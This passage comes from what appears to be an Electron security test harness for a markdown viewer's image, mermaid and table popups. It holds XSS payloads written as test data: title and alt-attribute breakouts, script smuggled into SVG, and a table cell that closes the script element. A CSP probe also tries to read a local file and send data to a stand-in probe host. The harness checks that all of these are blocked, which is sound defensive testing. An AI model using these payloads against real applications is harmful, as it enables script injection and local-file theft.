  const scope = { wc, contentsId: wc.id, state, frame: state?.frame, epoch: state?.epoch,
    frameTreeNodeId: state?.frame?.frameTreeNodeId, processId: state?.frame?.processId,
    routingId: state?.frame?.routingId,
    commit: state?.cdpCommit, originalURL: state?.originalURL,
    documentToken: state?.documentToken, guardEpoch: state?.guardEpoch };
  assertDocumentScope(scope);
  return Object.freeze(scope);
}

function isRetainedRoot(frame, scope) {
  try {
    // IPC may wrap the same frame in a different JS object. Pin its actual
    // node/process/routing identity, not optional preferences or wrapper equality.
    return !!frame && !!scope && !frame.isDestroyed() && !frame.detached && frame.parent === null &&
      frame.frameTreeNodeId === scope.frameTreeNodeId && frame.processId === scope.processId &&
      frame.routingId === scope.routingId && frame.url === scope.originalURL;
  } catch { return false; }
}

function assertDocumentScope(scope) {
  const state = scope && guards.get(scope.contentsId);
  if (!scope || !state || state !== scope.state || scope.wc.isDestroyed() ||
      state.epoch !== 1 || state.epoch !== scope.epoch || !state.cdpCommit ||
      state.cdpCommit !== scope.commit || !Number.isSafeInteger(scope.frameTreeNodeId) ||
      !Number.isSafeInteger(scope.processId) || !Number.isSafeInteger(scope.routingId) ||
      state.frame !== scope.frame || !isRetainedRoot(scope.frame, scope) ||
      !isRetainedRoot(scope.wc.mainFrame, scope) || scope.wc.getURL() !== scope.originalURL ||
      state.originalURL !== scope.originalURL ||
      scope.documentToken !== null && (state.documentToken !== scope.documentToken ||
        state.guardEpoch !== scope.guardEpoch)) {
    fatal(new Error("retained root frame/document epoch changed"));
    throw new Error("retained document scope refused");
  }
}

function assertMainOwner() {
  const state = main?.__shutdown?.state();
  if (finishing || !hostWindow || hostWindow.isDestroyed() ||
      hostWindow.webContents !== hostContents || hostContents.isDestroyed() ||
      hostContents.getURL() !== indexURL ||
      !storageReady || !mainIdentity || state.renderer !== "ready" ||
      state.rendererGeneration !== mainIdentity.generation ||
      state.rendererPageSession !== mainIdentity.pageSession ||
      OwnedDialogs.prototype.show !== refuseOwnedDialog ||
      [...nativeGuards].some(([name, guard]) => dialog[name] !== guard)) {
    throw new Error("authentic Main, current owner or native guard changed");
  }
  assertDocumentScope(mainIdentity.scope);
  verifyStorage(true);
}

async function mainEval(code) {
  assertMainOwner();
  const scope = await assertGuard(hostContents);
  if (!(await waitForExternalTrap(hostWindow, 1000))) throw new Error("Main shell guards changed");
  assertMainOwner();
  assertDocumentScope(scope);
  const value = await bounded(scope.frame.executeJavaScript(code, true), "Main renderer evaluation");
  assertDocumentScope(scope);
  assertMainOwner();
  return value;
}

function inspectMutes(report) {
  return report.mutes.every(mute => mute.suppressed.every(hit => {
    if (mute.reason === "sentinel liveness probe") {
      return hit.kind === "console-error" ? /sentinel-liveness-probe-\d+/.test(hit.detail) :
        hit.kind === "error-text-on-screen" && /Syntax error in text/.test(hit.detail);
    }
    if (!/^CSP (mermaid|image|table) popup: deliberate injection probe$/.test(mute.reason)) return false;
    if (hit.kind === "broken-image") return /does-not-exist-zzz/.test(hit.detail);
    if (hit.kind !== "console-error") return false;
    const inline = /(?:Executing|Refused to execute) inline (?:script|event handler)/i.test(hit.detail) &&
      /Content Security Policy|script-src/i.test(hit.detail);
    const connect = (hit.detail.includes(pathToFileURL(readableFile).href) || hit.detail.includes(PROBE_HOST)) &&
      /connect-src|Content Security Policy|Refused to connect/i.test(hit.detail);
    const missing = /does-not-exist-zzz/.test(hit.detail) && /ERR_FILE_NOT_FOUND/i.test(hit.detail);
    return inline || connect || missing;
  }));
}

async function closePopup(win) {
  const record = windows.get(win.id);
  if (!record || record.stopped) return;
  const id = record.id;
  if (win.isDestroyed()) throw new Error("popup destroyed before its live sentinel drain");
  assertDocumentScope(record.scope);
  const report = await bounded(record.sentinel.stop(), "live popup sentinel stop", 8000);
  assertDocumentScope(record.scope);
  closedReports.set(win.id, report);
  record.stopped = true;
  check(`sentinel ${win.id} suppresses only its exact deliberate probes`, inspectMutes(report), report.mutes);
  if (report.hits.length || report.stalls.length || results.slice(record.resultOffset).some(result => !result.ok)) {
    const shot = await bounded(captureScreenshot(win, "popup-failure-" + id), "popup failure capture before destruction", 3000);
    assertDocumentScope(record.scope);
    check(`popup ${id} ordinary failure capture precedes destruction`, typeof shot === "string" && shot.length > 0, shot);
  }
  closing.add(record.contentsId);
  win.destroy();
  const destroyed = win.isDestroyed() && record.wc.isDestroyed();
  check(`popup ${id} destruction is confirmed before fixture release`, destroyed);
  if (!destroyed) throw new Error("popup destruction was not confirmed");
  const file = record.originalURL && fileURLToPath(record.originalURL);
  check(`popup ${id} production close cleans its generated document directory`,
    !!file && !fs.existsSync(path.dirname(file)), file);
}

async function closeAll() {
  for (const record of windows.values()) {
    if (record.kind !== "main" && !record.stopped) await closePopup(record.win);
  }
}

function retainOwnedFixtures(reason) {
  stickyFailure = true;
  process.exitCode = 1;
  for (const dir of ownedFixtures) {
    registeredDirs?.delete(dir);
    retainedFixtures.add(dir);
  }
  try { fs?.writeSync(2, "RETAINED: " + reason + "; fixture sweeps excluded: " +
    JSON.stringify([...retainedFixtures]) + "\n"); } catch { /* Exit stays nonzero. */ }
}

function destroyOwners() {
  if (ownerCleanupInProgress) {
    const firstReentry = !ownerCleanupReentered;
    ownerCleanupReentered = true;
    retainOwnedFixtures("owner cleanup reentered before destruction verification");
    if (firstReentry) check("popup owner cleanup does not reenter", false, "destruction verification is still in progress");
    return false;
  }
  ownerCleanupInProgress = true;
  tearingDown = true;
  const protectedDirs = [];
  try {
    // Fence the actual shared registry BEFORE any destruction can synchronously
    // emit process exit. Re-register only the active entries after verification.
    for (const dir of ownedFixtures) {
      if (registeredDirs?.delete(dir)) protectedDirs.push(dir);
    }
    for (const item of pendingDownloads) {
      try { item.cancel(); } catch { /* Production may already have denied it. */ }
    }
    pendingDownloads.clear();
    let destroyed = true;
    for (const record of [...windows.values()].sort((a, b) => (a.kind === "main") - (b.kind === "main"))) {
      closing.add(record.contentsId);
      clearTimeout(guards.get(record.contentsId)?.timer);
      try {
        if (!record.win.isDestroyed()) record.win.destroy();
        if (!record.win.isDestroyed() || !record.wc.isDestroyed()) destroyed = false;
      } catch { destroyed = false; }
    }
    if (!destroyed || ownerCleanupReentered) {
      retainOwnedFixtures(ownerCleanupReentered ? "owner cleanup reentry remains sticky" : "owner destruction unconfirmed");
      if (!ownerCleanupReentered) check("terminal popup cleanup completed", false, "owner destruction unconfirmed");
      return false;
    }
    try { observeVerifiedOwners?.(); } catch { /* Observation must not change cleanup. */ }
    for (const dir of protectedDirs) {
      if (!retainedFixtures.has(dir)) registeredDirs.add(dir);
    }
    return true;
  } catch (error) {
    retainOwnedFixtures("owner cleanup failed: " + error.message);
    check("terminal popup cleanup completed", false, error.message);
    return false;
  } finally {
    ownerCleanupInProgress = false;
  }
}

function reportFooter() {
  if (footerWritten) return;
  footerWritten = true;
  const passed = results.filter(result => result.ok).length;
  const summary = `=== ${passed}/${results.length} passed${stickyFailure ? " (FAILED)" : ""} ===`;
  try { console.log(summary); writeReport(summary); } catch { stickyFailure = true; }
}

function fatal(error) {
  stickyFailure = true;
  if (finishing === "fatal" || finishing === "exiting") {
    try { fs?.writeSync(2, "SECONDARY popup failure: " + String(error?.stack || error) + "\n"); } catch { /* No reentry. */ }
    return;
  }
  // Escalate a normal bounded teardown synchronously: a veto/watchdog must
  // never wait behind a capture already in progress. Secondary fatals return.
  finishing = "fatal"; // No await, capture or reporting may precede this latch.
  clearTimeout(watchdog);
  try { check("popup fatal safety refusal", false, String(error?.stack || error)); }
  finally {
    destroyOwners();
    reportFooter();
    if (app) app.exit(1);
    else process.exit(1);
  }
}

async function finish(error) {
  if (finishing) return;
  finishing = "normal";
  if (error) check("harness completed without throwing", false, String(error?.stack || error));
  try {
    // Sentinel stop does not need assertGuard/waitUntil and remains bounded
    // after the single finishing latch has excluded any new scenario actors.
    for (const record of windows.values()) {
      if (!record.stopped && !record.win.isDestroyed()) {
        try {
          if (record.scope) assertDocumentScope(record.scope);
          const report = await bounded(record.sentinel.stop(), "terminal live sentinel stop", 8000);
          if (record.scope) assertDocumentScope(record.scope);
          closedReports.set(record.win.id, report);
          record.stopped = true;
        } catch (cleanupError) {
          check("live sentinel teardown completed", false, cleanupError.message);
        }
      }
    }
    if (stickyFailure && !results.some(result => !result.ok)) {
      check("terminal safety failure remains sticky", false, "a secondary safety event occurred during finishing");
    }
    check("every popup was watched, and none rendered a visible error",
      windows.size > 1 && closedReports.size === windows.size &&
        [...windows].every(([id, record]) => popupSentinels.get(id) === record.sentinel && closedReports.has(id)) &&
        [...closedReports.values()].every(report => report.hits.length === 0 && inspectMutes(report)),
      JSON.stringify([...closedReports].map(([id, report]) => ({ id, hits: report.hits }))));
    check("no popup sentinel stalled trying to reach its window",
      closedReports.size === windows.size && [...closedReports.values()].every(report => report.stalls.length === 0),
      JSON.stringify([...closedReports].map(([id, report]) => ({ id, stalls: report.stalls }))));
    check("SEC-11/12 final network observer contains no forbidden probe or non-image request",
      netSentinel.every(request => !request.share && request.type === "image" &&
        /^https:\/\/example\.invalid\//.test(request.url)), netSentinel);
    check("SEC-12 network observer actually sees the allowed image positive control",
      netSentinel.some(request => request.type === "image" && request.url === "https://example.invalid/d.png" &&
        [...windows.values()].some(record => record.kind === "image" && record.contentsId === request.contentsId)),
      netSentinel);
  } catch (cleanupError) {
    check("live sentinel teardown completed", false, cleanupError.message);
  } finally {
    try {
      // A clean functional run can still fail its final sentinel drain. Decide
      // capture only after those reports have contributed to the sticky result.
      if (stickyFailure) {
        for (const record of windows.values()) {
          if (!record.win.isDestroyed()) {
            if (record.scope) assertDocumentScope(record.scope);
            const shot = await bounded(captureScreenshot(record.win, "popup-final-failure-" + record.id),
              "ordinary failure capture", 3000).catch(captureError => {
              check("ordinary failure capture is bounded", false, captureError.message);
              return null;
            });
            if (record.scope) assertDocumentScope(record.scope);
            check(`popup ${record.id} terminal failure capture succeeds`,
              typeof shot === "string" && shot.length > 0, shot);
          }
        }
      }
    } catch (captureError) {
      check("ordinary failure capture is bounded", false, captureError.message);
    }
    try {
      if (destroyOwners()) {
        for (const remove of observers) {
          try { remove(); } catch (removeError) { check("popup observer removed", false, removeError.message); }
        }
        for (const remove of downloadObservers) {
          try { remove(); } catch (removeError) { check("download observer removed", false, removeError.message); }
        }
        if (app.isReady()) session.defaultSession.webRequest.onBeforeRequest(null);
        for (const record of windows.values()) {
          if (record.kind !== "main" && record.originalURL) {
            const directory = path.dirname(fileURLToPath(record.originalURL));
            check(`popup ${record.id} final production directory cleanup is verified`, !fs.existsSync(directory), directory);
          }
        }
        for (const dir of ownedFixtures) {
          if (!retainedFixtures.has(dir)) check("owned popup fixture directory released after all owners", releaseTempDir(dir), dir);
        }
      }
    } catch (terminalError) {
      check("terminal popup cleanup completed", false, terminalError.stack || terminalError.message);
    } finally {
      destroyOwners();
      clearTimeout(watchdog);
      reportFooter();
      finishing = "exiting";
      app.exit(stickyFailure ? 1 : 0);
    }
  }
}

async function run() {
  checkLoadFileDelegation();
  await waitUntil(() => mainStartup?.loadIssued && mainStartup.record?.kind === "main" &&
    main.__shutdown.state().renderer === "ready" && mainStartup.record.wc.getURL() === indexURL &&
    !mainStartup.record.wc.isLoadingMainFrame(), "intended Main index commit and bridge readiness");
  const candidate = mainStartup.record;
  const scope = await assertGuard(candidate.wc);
  const witness = await bounded(scope.frame.executeJavaScript(`(async () => ({
    generation: await window.folia.getQuitApprovalGeneration(),
    pageSession: window.getReloadRequestSession(),
    bridge:typeof window.folia.openFileDialog==='function'&&
      ['openImagePopup','openMermaidPopup','openTablePopup'].every(key=>typeof window.folia[key]==='function')
  }))()`, true), "Main owner generation");
  assertDocumentScope(scope);
  const currentMain = main.__shutdown.state();
  const authenticMain = mainStartup.record === candidate && mainStartup.loadIssued &&
    candidate.win.webContents === candidate.wc && scope.originalURL === indexURL &&
    isRetainedRoot(candidate.wc.mainFrame, scope) && scope.guardEpoch === scope.epoch &&
    witness.bridge && Number.isSafeInteger(witness.generation) && witness.generation > 0 &&
    typeof witness.pageSession === "string" && witness.pageSession.length > 0 &&
    currentMain.renderer === "ready" && currentMain.rendererGeneration === witness.generation &&
    currentMain.rendererPageSession === witness.pageSession;
  check("Main binds the intended index commit to its authenticated bridge and retained guarded root",
    authenticMain, { witness, epoch: scope.epoch, guardEpoch: scope.guardEpoch });
  if (!authenticMain) { fatal(new Error("provisional Main did not authenticate")); return; }
  hostWindow = candidate.win;
  hostContents = candidate.wc;
  candidate.scope = scope;
  mainIdentity = { generation: witness.generation, pageSession: witness.pageSession, scope };
  mainStartup = null;
  assertMainOwner();
  const mainPrefs = prefsOf(hostWindow);
  check("SEC-08 authenticated Main is sandboxed, isolated and Node-off",
    !mainPrefs.nodeIntegration && mainPrefs.contextIsolation && mainPrefs.sandbox, mainPrefs);
  if (!(await waitForExternalTrap(hostWindow, 1000))) throw new Error("shell trap not ready before actors");
  const alive = await bounded(proveSentinelAlive(hostWindow, sentinelOf(hostWindow)), "Main sentinel liveness", 8000);
  assertMainOwner();
  check("Main sentinel observes both console and DOM errors", alive.console && alive.dom, alive);
  const startup = await mainEval(`(() => ({
    tabs: window.CustomTabs.getTabs().length, descriptor: window.CustomTabs.getDocumentDescriptor(),
    dirty: window.CustomTabs.__dirtyTabNames(), unsaved: hasUnsavedWork(),
    path: currentFilePath, markdown: originalMarkdown
  }))()`);
  const state = main.__shutdown.documentSessionState();
  const clean = isolation.POST_WIPE_ENTRIES === 0 && startup.tabs === 0 && startup.descriptor === null &&
    startup.dirty.length === 0 && !startup.unsaved && !startup.path && startup.markdown === "" &&
    state.admissions === 0 && state.entries.length === 0 && state.history.length === 0 && state.owners.length === 0;
  check("Main starts genuinely clean without inherited tabs or admission", clean, { startup, state });
  if (!clean) throw new Error("unexpected startup; no tabs will be discarded");
  const cost = isLargeDocument(themeDoc);
  check("popup fixture is below the real render-confirmation budget",
    !cost.large && Number.isFinite(cost.estimatedMs) && cost.estimatedMs <= LARGE_DOC_BUDGET_MS, cost);
  if (cost.large || !Number.isFinite(cost.estimatedMs)) throw new Error("fixture needs prohibited render consent");
  chooserAllowance = { window: hostWindow, contents: hostContents, scope: mainIdentity.scope };
  await mainEval("document.getElementById('openFile').click(); true");
  await waitUntil(async () => (await mainEval(`(() => {
    const tab=window.CustomTabs.getActiveTab(), descriptor=window.CustomTabs.getDocumentDescriptor();
    const img=document.querySelector('#viewer img');
    return window.CustomTabs.getTabs().length===1&&tab?.filePath===${JSON.stringify(documentFile)}&&
      tab.content===${JSON.stringify(themeDoc)}&&tab.originalContent===${JSON.stringify(themeDoc)}&&!tab.hasUnsavedChanges&&
      currentFilePath===${JSON.stringify(documentFile)}&&originalMarkdown===${JSON.stringify(themeDoc)}&&
      descriptor?.logicalPath===${JSON.stringify(documentFile)}&&
      document.querySelector('#viewer h1')?.textContent==='Popup admission'&&
      document.querySelectorAll('#viewer table').length===1&&
      document.querySelectorAll('#viewer .mermaid svg').length===1&&
      img?.complete&&img.naturalWidth===120&&!document.getElementById('loadingScreen').classList.contains('active');
  })()`)) === true, "native-admitted fixture paint", 20000);
  const admitted = await mainEval(`(() => ({
    descriptor:window.CustomTabs.getDocumentDescriptor(),
    identity:window.CustomTabs.getActiveDocumentIdentity(${JSON.stringify(documentFile)},window.getReloadRequestSession())
  }))()`);
  await waitUntil(() => main.__shutdown.documentOwnerGuards(admitted.identity, documentFile).closing,
    "real Main document owner registration");
  const owner = main.__shutdown.documentOwnerGuards(admitted.identity, documentFile);
  const authentic = chooserCalls === 1 && chooserAllowance === null &&
    /^[a-f0-9]{64}$/.test(admitted.descriptor.ref) &&
    admitted.identity.documentRef === admitted.descriptor.ref &&
    admitted.identity.rendererGeneration === mainIdentity.generation &&
    admitted.identity.pageSession === mainIdentity.pageSession &&
    main.__shutdown.documentAdmissionIsCurrent(admitted.descriptor.ref) && owner.identity && owner.closing;
  check("one exact toolbar Open admits the real document and current Main owner", authentic, { admitted, owner, chooserCalls });
  if (!authentic) throw new Error("fixture admission is not authentic");

  // ==========================================================================
  // SEC-05 - image popup interpolates alt into <title> and into an attribute
  // ==========================================================================
  let popup = await openPopup("open-image-popup", {
    src: pathToFileURL(imageFile).href,
    alt: "</title><script>window.__pwned='img-title'</script>",
    isDarkMode: false,
  });
  check(
    "SEC-05 image popup opens for a hostile alt",
    popup !== null,
    "no popup window appeared",
  );
  if (popup) {
    check(
      "SEC-05 alt cannot break out of <title> in the image popup",
      (await pwned(popup)) === null,
      "window.__pwned was set from an image alt attribute",
    );
    const prefs = prefsOf(popup);
    check(
      "SEC-08 image popup does not run with Node integration",
      prefs.nodeIntegration === false && prefs.contextIsolation === true,
      JSON.stringify(prefs),
    );
  }
  await closeAll();

  // Second variant: break out of the alt="" attribute on the <img> itself.
  const hostileAlt = '" onerror="window.__pwned=\'img-attr\'" data-x="';
  popup = await openPopup("open-image-popup", {
    src: pathToFileURL(brokenImageFile).href,
    alt: hostileAlt,
    isDarkMode: false,
  });
  if (popup) {
    const failedImage = await popupEval(popup, `(() => {
      const img=document.getElementById('the-img');
      return {src:img?.getAttribute('src'),alt:img?.getAttribute('alt'),
        complete:img?.complete,naturalWidth:img?.naturalWidth,handler:img?.hasAttribute('onerror'),
        errors:window[${JSON.stringify(guardKey)}].read().imageErrors};
    })()`);
    check("SEC-05 hostile image attribute fixture reaches a real decode error",
      failedImage.src === pathToFileURL(brokenImageFile).href && failedImage.complete === true &&
        failedImage.naturalWidth === 0 && Array.isArray(failedImage.errors) &&
        failedImage.errors.some(error => error.src === pathToFileURL(brokenImageFile).href &&
          error.trusted === true && error.complete === true && error.naturalWidth === 0) &&
        fs.readFileSync(brokenImageFile, "utf8") === "owned bytes that cannot decode as an image",
      failedImage);
    check(
      "SEC-05 alt cannot break out of the img alt attribute",
      (await pwned(popup)) === null && failedImage.alt === hostileAlt && failedImage.handler === false,
      "window.__pwned was set via an alt attribute breakout",
    );
  }
  await closeAll();

  // Feature: an ordinary image still loads, with its alt and title intact.
  popup = await openPopup("open-image-popup", {
    src: pathToFileURL(imageFile).href,
    alt: 'Plain "quoted" & <angled> caption',
    isDarkMode: false,
  });
  if (popup) {
    const state = await popupEval(
      popup,
      `(() => {
         const img = document.getElementById('the-img');
         return {
           hasImg: !!img,
           src: img ? img.getAttribute('src') : null,
           alt: img ? img.getAttribute('alt') : null,
           decoded: !!img && img.complete && img.naturalWidth === 120 && img.naturalHeight === 60,
           title: document.title
         };
       })()`,
    );
    check(
      "FEATURE image popup still renders the image with its src and alt",
      state.hasImg === true &&
        state.src === pathToFileURL(imageFile).href && state.decoded === true &&
        state.alt === 'Plain "quoted" & <angled> caption',
      JSON.stringify(state),
    );
    check(
      "FEATURE image popup title still carries the alt text",
      state.title === 'Plain "quoted" & <angled> caption',
      JSON.stringify(state),
    );
  }
  await closeAll();

  // ==========================================================================
  // ==========================================================================
  // REMOVAL PIN - the OmniWare wireframe feature was removed from the fork.
  //
  // There is deliberately no arbitrary-send bridge. This is an architecture
  // removal check, not a claim to execute an unreachable legacy IPC actor.
  // ==========================================================================
  const removedRoute = await mainEval(`({
    publicKeys:Object.keys(window.folia),
    rawIPC:typeof window.folia.send,
    legacy:typeof window.folia.openOmniwarePopup
  })`);
  check(
    "REMOVED OmniWare has neither a Main listener nor a public popup route",
    ipcMain.listenerCount("open-omniware-popup") === 0 &&
      removedRoute.legacy === "undefined" && removedRoute.rawIPC === "undefined" &&
      !removedRoute.publicKeys.some(key => /omniware/i.test(key)) &&
      ["openImagePopup", "openMermaidPopup", "openTablePopup"].every(key => removedRoute.publicKeys.includes(key)),
    removedRoute,
  );
  await closeAll();

  // ==========================================================================
  // SEC-07 - mermaid popup interpolates the rendered SVG raw
  // ==========================================================================
  popup = await openPopup(
    "open-mermaid-popup",
    {
      svgContent:
        "<svg xmlns='http://www.w3.org/2000/svg'><text>d</text></svg>" +
        "<scr" + "ipt>window.__pwned='mermaid-popup'</scr" + "ipt>",
      isDarkMode: false,
    },
    2200,
  );
  check(
    "SEC-07 mermaid popup opens for hostile SVG content",
    popup !== null,
    "no popup window appeared",
  );
  if (popup) {
    check(
      "SEC-07 script smuggled in the SVG payload does not execute",
      (await pwned(popup)) === null,
      "window.__pwned was set from mermaid popup SVG content",
    );
    const prefs = prefsOf(popup);
    check(
      "SEC-08 mermaid popup does not run with Node integration",
      prefs.nodeIntegration === false && prefs.contextIsolation === true,
      JSON.stringify(prefs),
    );
  }
  await closeAll();

  // Feature: a genuine mermaid SVG still shows up in the popup.
  popup = await openPopup(
    "open-mermaid-popup",
    {
      svgContent:
        "<svg id='real-diagram' xmlns='http://www.w3.org/2000/svg' width='120' height='60'><text x='5' y='20'>Start</text></svg>",
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    const state = await popupEval(
      popup,
      `(() => {
         const svg = document.querySelector('svg');
         const rect = svg?.getBoundingClientRect();
         return { hasSvg: !!svg, visible:!!rect&&rect.width>0&&rect.height>0,
           text: svg ? (svg.textContent || '').trim() : null };
       })()`,
    );
    check(
      "FEATURE mermaid popup still displays the rendered diagram",
      state.hasSvg === true && state.visible === true && state.text === "Start",
      JSON.stringify(state),
    );
  }
  await closeAll();

  // ==========================================================================
  // CSP - the popups load from file://, and a file:// document in Electron can
  // read other local files and reach the network. So an injection that manages
  // to execute is local-file theft, not a contained nuisance. The nonce CSP is
  // the control that makes that unreachable; these assert it is actually on
  // each document and actually enforcing.
  // ==========================================================================
  const CSP_CASES = [
    ["mermaid", "open-mermaid-popup", { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false }],
    ["image", "open-image-popup", { src: pathToFileURL(imageFile).href, alt: "a", isDarkMode: false }],
    ["table", "open-table-popup", { tableData: { data: [{ a: "1" }], columns: [{ title: "A", field: "a" }] }, isDarkMode: false }],
  ];

  for (const [label, channel, payload] of CSP_CASES) {
    popup = await openPopup(channel, payload, 1500);
    if (!popup) {
      check(`CSP ${label} popup opens`, false, "no window appeared");
      continue;
    }
    const csp = await popupEval(
      popup,
      `(() => {
         const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
         return m ? m.getAttribute('content') : null;
       })()`,
    );
    check(
      `CSP ${label} popup declares a nonce policy`,
      typeof csp === "string" && /script-src 'nonce-[^']+'/.test(csp) && /connect-src 'none'/.test(csp),
      String(csp).slice(0, 120),
    );

    // The document's own script must still have RUN. Counting <script nonce>
    // tags is not that test and was found vacuous in review: a tag can be
    // present while its script never executed (refused, thrown, aborted), and a
    // popup broken that way still passes every CSP probe below, because a
    // broken popup refuses injected script just as convincingly as a working
    // one. So each case names an effect that only exists once its own script
    // has run - and the nonce is read back via the IDL property, which is the
    // only way to see it after Chromium's nonce-hiding clears the attribute.
    const alive = await popupEval(
      popup,
      `(() => {
         const tags = [...document.querySelectorAll('script[nonce]')];
         return {
           nonced: tags.length,
           // Nonce hiding: getAttribute('nonce') is emptied once the document
           // is parsed, precisely so injected script cannot read and reuse it.
           nonceReadable: tags.some(t => typeof t.nonce === 'string' && t.nonce.length > 0),
           ran: ${JSON.stringify(label)} === 'mermaid'  ? (typeof window.resetView === 'function' && !!(document.getElementById('viewport') || {}).style.transform)
              : ${JSON.stringify(label)} === 'image'    ? typeof window.resetView === 'function'
              : document.getElementById('data-table').childElementCount > 0,
           body: document.body.innerHTML.length,
         };
       })()`,
    );
    check(
      `CSP ${label} popup's own nonce-carrying script actually ran`,
      alive && alive.nonced > 0 && alive.nonceReadable === true && alive.ran === true,
      JSON.stringify(alive),
    );

    // Inject a script the way an XSS payload would, and confirm the browser
    // refuses to run it because it carries no nonce.
    //
    // Every refusal below is logged to the popup's console, so the watcher has
    // to be muted here or the run fails on its own probes. Muted per popup and
    // only for this block: a CSP refusal anywhere else in this suite is a real
    // finding - that is how a font regression was caught before now.
    await bounded(sentinelOf(popup).mute(`CSP ${label} popup: deliberate injection probe`), "CSP mute", 8000);
    const injected = await popupEval(
      popup,
      `(async () => {
         const violations=[];
         document.addEventListener('securitypolicyviolation',event=>violations.push({
           directive:event.effectiveDirective, blocked:event.blockedURI
         }));
         const s = document.createElement('script');
         s.textContent = 'window.__cspEscape = true;';
         document.body.appendChild(s);
         const img = document.createElement('img');
         img.setAttribute('src', 'does-not-exist-zzz');
         img.setAttribute('onerror', 'window.__cspHandler = true;');
         document.body.appendChild(img);
         await new Promise(r => setTimeout(r, 400));
         let fileRead = 'blocked';
         try {
           const r = await fetch(${JSON.stringify(pathToFileURL(readableFile).href)});
           fileRead = 'READ:' + (await r.text()).length;
         } catch (e) {}
         let exfil = 'blocked';
         try { await fetch('https://${PROBE_HOST}/x', { method: 'POST', body: 'y' }); exfil = 'SENT'; } catch (e) {}
         await new Promise(r=>setTimeout(r,100));
         img.remove(); s.remove();
         return {
           scriptRan: !!window.__cspEscape,
           handlerRan: !!window.__cspHandler,
           fileRead,
           exfil,
           violations,
         };
       })()`,
    );
    check(
      `CSP ${label} popup refuses an injected script element`,
      injected && injected.scriptRan === false &&
        injected.violations.some(v => v.directive === "script-src-elem"),
      JSON.stringify(injected),
    );
    check(
      `CSP ${label} popup refuses an injected inline event handler`,
      injected && injected.handlerRan === false &&
        injected.violations.some(v => v.directive === "script-src-attr"),
      JSON.stringify(injected),
    );
    check(
      `CSP ${label} popup cannot read local files or reach the network`,
      injected && injected.fileRead === "blocked" && injected.exfil === "blocked" &&
        fs.readFileSync(readableFile, "utf8") === "popup-owned-readable-control" &&
        injected.violations.some(v=>v.directive === "connect-src") &&
        injected.violations.some(v=>/^script-src/.test(v.directive)),
      JSON.stringify(injected),
    );
    // Assert the probe really did provoke refusals. Without this, a CSP that
    // stopped being applied would show up here as a quiet, empty mute.
    await bounded(sentinelOf(popup).drain(), "CSP probe drain", 8000);
    const probeMute = sentinelOf(popup).currentMute();
    check(
      `CSP ${label} popup's injection probe was actually refused by the policy`,
      !!probeMute &&
        probeMute.suppressed.some((s) =>
          /Content Security Policy|violates the following/i.test(s.detail || ""),
        ) && inspectMutes({ mutes: [probeMute] }),
      JSON.stringify(probeMute),
    );
    await bounded(sentinelOf(popup).unmute(), "CSP unmute", 8000);
    await closeAll();
  }

  // ==========================================================================
  // Table popup - cells come from the markdown document and were embedded with
  // JSON.stringify, which does not escape `<`, so a cell could close the
  // script element.
  // ==========================================================================
  const hostileCell = "</script><script>window.__pwned='table'</script>";
  popup = await openPopup(
    "open-table-popup",
    {
      tableData: {
        data: [{ a: hostileCell }],
        // formatter: "html" ON PURPOSE. The boundary's allow-list drops it, and
        // without it here nothing in the suite measured that. formatters.html
        // is literally `function(e,t,i){return e.getValue()}` - it returns the
        // cell value RAW and resolves with no console warning - so if
        // `formatter` ever reached Tabulator again, this cell's payload would
        // be written as markup, the </script> would terminate the popup's
        // script element and the injectedScripts oracle below would fail. It
        // costs nothing while the allow-list holds.
        columns: [{ title: "A", field: "a", formatter: "html" }],
      },
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    check(
      "SEC-06 table popup opens for hostile cell content",
      true,
    );
    // Run the channel control on THIS popup. window globals do not survive a
    // new BrowserWindow, so a control run elsewhere says nothing here - the
    // earlier negatives at the top of this suite are on different windows and
    // are covered by their own sibling conjuncts, not by this.
    const chan = await pwnedChannelLive(popup);
    check(
      "SEC-06 the __pwned read channel is observable, so its absence checks mean something",
      chan.ok === true,
      JSON.stringify(chan),
    );
    // Two independent controls are in play here, so assert both. The CSP alone
    // stops the injected <script> from running - but the cell can still
    // terminate the generated <script> element, which silently destroys the
    // rest of the document. `scriptIntact` is the part that only toJsonLiteral
    // can satisfy: with a plain JSON.stringify the payload closes the script
    // and Tabulator never initialises.
    const structure = await popupEval(
      popup,
      `(() => {
         const scripts = [...document.querySelectorAll('script')];
         return {
           injectedScripts: scripts.filter((s) => !s.nonce && !s.src).length,
           tabulatorLoaded: typeof window.Tabulator !== 'undefined',
           cellElements:document.querySelector('.tabulator-cell')?.querySelectorAll('*').length??-1,
         };
       })()`,
    );
    const table = await popupEval(
      popup,
      `(() => {
         const rows = document.querySelectorAll('.tabulator-row').length;
         const cell=document.querySelector('.tabulator-cell'), rect=cell?.getBoundingClientRect();
         return { rows, hasTable: !!window.Tabulator,
           showsPayload:cell?.innerText===${JSON.stringify(hostileCell)}&&rect?.width>0&&rect?.height>0 };
       })()`,
    );
    check(
      "SEC-06 table cell cannot terminate the popup's script element",
      (await pwned(popup)) === null &&
        structure &&
        structure.injectedScripts === 0 &&
        structure.cellElements === 0 &&
        structure.tabulatorLoaded === true &&
        table.showsPayload === true,
      JSON.stringify({ structure, table }),
    );
    check(
      "FEATURE table popup still builds the table from the data",
      table && table.hasTable === true && table.rows > 0 && table.showsPayload === true,
      JSON.stringify(table),
    );
  } else {
    check("SEC-06 table popup opens for hostile cell content", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // SEC-31 hostile column TITLES in the table popup. SEC-06 above covers cell
  // DATA, and cells are safe for a reason that does not extend to titles:
  // Tabulator's Format module defaults an unset `formatter` to `plaintext`
  // (lookupTypeFormatter -> lookupFormatter, `default:` branch), which runs the
  // value through sanitizeHTML. An unset `titleFormatter` takes a different
  // path - formatHeader returns the title UNCHANGED, and
  // _formatColumnHeaderTitle's `default:` branch does `el.innerHTML = contents`.
  // So cells default to escaped and titles default to RAW, from the same
  // document-controlled markdown. Verified by reading the vendored bundle
  // itself - libs/tabulator/tabulator.min.js, banner "Tabulator v6.5.2",
  // 445,987 bytes - at the byte offsets named beside each claim below. It is
  // the MINIFIED build, so it is not comparable to the tarball's unminified
  // dist/js/tabulator.js; the corresponding upstream artifact is
  // dist/js/tabulator.min.js, and tabulator-tables is not in node_modules, so
  // the vendored bytes are the only in-tree source of truth.
  //
  // The CSP is a real but PARTIAL mitigation, which is why this block asserts
  // three separate things rather than only "nothing executed":
